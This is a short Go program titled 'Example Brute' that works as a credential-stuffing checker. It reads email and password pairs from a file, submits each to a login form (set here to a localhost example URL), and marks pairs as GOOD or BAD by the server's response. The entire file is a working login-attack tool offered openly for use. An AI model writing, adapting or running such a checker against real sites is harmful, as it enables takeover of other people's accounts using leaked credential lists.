/**
	* hope it helps u 							* 
	* By Nikita Vtorushin<n.vtorushin@inbox.ru> *
	* @nikitavoryet 							*
	* Example Brute	- GoLang					*
**/

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const nameFile = "base.txt"

const bruteUrl = "https://localhost/authExample/index.php"

func main() {
	fmt.Println("Starting Example Brute - GoLang. By Nikita Vtorushin<n.vtorushin@inbox.ru>")
	start()
}

func start() {
	file, err := os.Open(nameFile)
	lines, err := countLinesInFile(nameFile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	fmt.Println("Checking... Base Lines:", lines)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := scanner.Text()
		fields := strings.Split(strings.Replace(text, ";", ":", 1), ":")
		resp, err := http.PostForm(bruteUrl,
			url.Values{"email": {fields[0]}, "password": {fields[1]}})
		if err != nil {
			log.Fatal("Site not available: ", bruteUrl, "\nERROR:")
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			log.Fatal(err)
		}

		req := string(body)

		if strings.Contains(req, "good") {
			fmt.Println("[GOOD]", fields[0]+":"+fields[1])

		} else {
			fmt.Println("[BAD] ", fields[0]+":"+fields[1])
		}

	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func countLinesInFile(fileName string) (int, error) {
	file, err := os.Open(fileName)

	if err != nil {
		return 0, err
	}

	buf := make([]byte, 1024)
	lines := 0

	for {
		readBytes, err := file.Read(buf)

		if err != nil {
			if readBytes == 0 && err == io.EOF {
				err = nil
			}
			return lines + 1, err
		}

		lines += bytes.Count(buf[:readBytes], []byte{'\n'})
	}
}
